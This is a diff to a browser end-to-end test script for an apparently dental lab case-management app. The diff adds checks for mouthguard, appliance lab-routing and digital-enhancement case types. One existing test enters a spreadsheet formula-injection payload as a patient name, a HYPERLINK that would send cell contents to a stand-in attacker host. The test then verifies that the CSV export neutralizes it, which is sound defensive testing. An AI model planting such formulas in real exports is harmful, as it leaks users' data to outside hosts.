@@ -306,7 +306,7 @@ async function openByName(p, name) {
   await owner.click('#nav-admin'); await owner.click('[data-act=loadDeleted]');
   await owner.waitForSelector('#delBox .row:has-text("' + P3 + '")', { timeout: 20000 });
   await owner.click('#delBox .row:has-text("' + P3 + '") [data-act=undelete]');
-  await owner.waitForSelector('.toast:has-text("restored")', { timeout: 20000 });
+  await owner.waitForSelector('.toast:has-text("' + P3 + ' restored")', { timeout: 20000 });
   await owner.click('#nav-list'); await owner.fill('#q', P3);
   await owner.waitForSelector('tr.click:has-text("' + P3 + '")', { timeout: 20000 });
   check(true, 'deleted case restored from Team & security');
@@ -405,6 +405,68 @@ async function openByName(p, name) {
   check(await owner.isVisible('#drawer .tooth.m-implant[data-t=UL6]'), 'editing restores the tooth chart');
   await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
 
+  console.log('\n# Mouthguard (in-house, complimentary)');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  await owner.click('#ncForm .tt[data-tile=mouthguard]'); await owner.fill('#cf-patient', 'Milo Guardsman');
+  check(await owner.isVisible('.pickRow[data-g=arches]') && !(await owner.isVisible('.pickRow[data-g=retKinds]')), 'asks for the arch, not TT’s/WT’s');
+  check(!(await owner.isVisible('.pickRow[data-g=initial]')), 'no refinement question for a mouthguard');
+  await owner.click('.pickRow[data-g=arches] .pick[data-v=Upper]');
+  check(await owner.inputValue('#cf-detail') === 'Mouthguard (U)', 'detail reads Mouthguard (U)');
+  check(await owner.inputValue('#cf-dueDate') === await owner.evaluate(() => addClinicDays(todayISO(), 2)), 'due in two clinic days, like retainers');
+  check(await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'assigned to whoever creates it');
+  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
+  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=retainer]');
+  await owner.waitForSelector('section[aria-label="Printing"] .kc:has-text("Milo Guardsman") .badge:has-text("Mouthguard")', { timeout: 20000 });
+  check(true, 'lands on the retainers & mouthguards board at Printing, marked Mouthguard');
+
+  console.log('\n# Appliances: the lab is picked from the office routing');
+  const labNow = async () => (await owner.locator('.pickRow[data-g=lab] .pick[aria-pressed=true]').allTextContents()).join('|');
+  const tapAppl = v => owner.click('.pickRow[data-g=appliances] .pick[data-v="' + v + '"]');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  await owner.click('#ncForm .tt[data-tile=appliance]'); await owner.fill('#cf-patient', 'Dmitri Distalson');
+  check(!(await owner.isVisible('.pickRow[data-g=initial]')) && !(await owner.isVisible('.pickRow[data-g=initialDE]')), 'no refinement question for appliances');
+  await tapAppl('MSE'); check(await labNow() === 'Specialty Orthodontic Lab', 'MSE → Specialty Orthodontic Lab');
+  await tapAppl('MSE'); await tapAppl('MARPE'); check(await labNow() === 'Partner Dental Studios', 'MARPE → Partner Dental Studios');
+  await tapAppl('MARPE'); await tapAppl('MARA'); check(await labNow() === 'Specialty Orthodontic Lab', 'MARA → Specialty Orthodontic Lab');
+  await tapAppl('MARA'); await tapAppl('D2 distalizer'); check(await labNow() === 'In-house (NL Lab)', 'D2 distalizer → in-house (NL Lab)');
+  check(await owner.inputValue('#cf-stage') === 'mfg' && await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'in-house D2 starts in Manufacturing with Dr. A');
+  await tapAppl('MSE'); check(/different labs/.test(await owner.textContent('#cf-labHint')), 'mixing labs says to make one case per lab');
+  await tapAppl('MSE');
+  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.click('#ncForm .tt[data-tile=appliance]');
+  check(await labNow() === 'In-house (NL Lab)' && await owner.inputValue('#cf-stage') === 'mfg', 'switching type and back keeps the D2 routing');
+  check(await owner.inputValue('#cf-detail') === 'D2 distalizer', 'detail reads D2 distalizer');
+  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
+  await openByName(owner, 'Dmitri Distalson');
+  check(await owner.isVisible('#drawer .badge:has-text("In-house (NL Lab)")') && await owner.isVisible('#drawer .badge:has-text("D2 distalizer")'), 'case shows the appliance and its lab');
+  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  await owner.click('#ncForm .tt[data-tile=appliance]');
+  await owner.click('.pickRow[data-g=lab] .pick[data-v="Partner Dental Studios"]'); await tapAppl('MSE');
+  check(await labNow() === 'Partner Dental Studios', 'a lab tapped by hand is kept');
+  await owner.mouse.click(5, 5);
+  check(await owner.isVisible('#ncForm'), 'a stray click outside the form does not throw it away');
+  await owner.click('.modal [data-act=closeModal]');
+
+  console.log('\n# InSmile: digital enhancements instead of refinements');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  await owner.click('#ncForm .tt[data-tile=insmile]'); await owner.fill('#cf-patient', 'Ines Smilewright');
+  check(await owner.isVisible('.pickRow[data-g=initialDE]') && !(await owner.isVisible('.pickRow[data-g=initial]')), 'asks Initial / DE 1 / DE 2 / DE 3 instead of refinement');
+  check(!(await owner.isVisible('.pickRow[data-g=instrPicks] .pick:has-text("Aligners are not tracking well")')) && await owner.isVisible('.pickRow[data-g=instrPicks] .pick:has-text("Class II correction is needed")'), 'aligner-only instructions hidden for braces');
+  check(!(await owner.isVisible('#cf-tc')), 'no aligner tooth chart for braces');
+  await owner.click('.pickRow[data-g=initialDE] .pick[data-v=de2]');
+  check(await owner.inputValue('#cf-detail') === 'InSmile braces – DE2', 'detail reads InSmile braces – DE2');
+  check(await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'InSmile assigned to whoever creates it');
+  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
+  await openByName(owner, 'Ines Smilewright');
+  check(await owner.isVisible('#drawer .badge:has-text("Digital enhancement 2 (DE2)")') && !(await owner.isVisible('#drawer .badge:has-text("Refinement")')), 'case shows Digital enhancement 2 (DE2)');
+  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
+  check((await owner.getAttribute('#drawer .pickRow[data-g=initialDE] .pick[data-v=de2]', 'aria-pressed')) === 'true', 'editing keeps DE 2');
+  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  await owner.click('#ncForm .tt[data-tile=inbrace]');
+  check(!(await owner.isVisible('.pickRow[data-g=initial]')) && !(await owner.isVisible('.pickRow[data-g=initialDE]')), 'InBrace: no refinement question either');
+  await owner.click('.modal [data-act=closeModal]');
+
   console.log('\n# Spreadsheet-formula text is neutralized in the export');
   await owner.fill('#q', ''); await newCase(owner, { type: 'misc', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });
 
@@ -414,6 +476,7 @@ async function openByName(p, name) {
   const exp = fs.readFileSync(await dl.path(), 'utf8');
   check(exp.includes(P1) && exp.includes(P2) && exp.includes('Imogen Fakeworth'), 'export includes open and completed cases');
   check(exp.includes('"\'=HYPERLINK(') && !/(^|,)"=HYPERLINK/m.test(exp), 'formula-looking text is exported as plain text');
+  check(exp.includes('Digital enhancement 2 (DE2)') && exp.includes('Mouthguard (U)'), 'export carries DE and mouthguard details');
 
   console.log('\n# Activity');
   await owner.click('#nav-admin'); await owner.click('[data-act=loadActivity]');
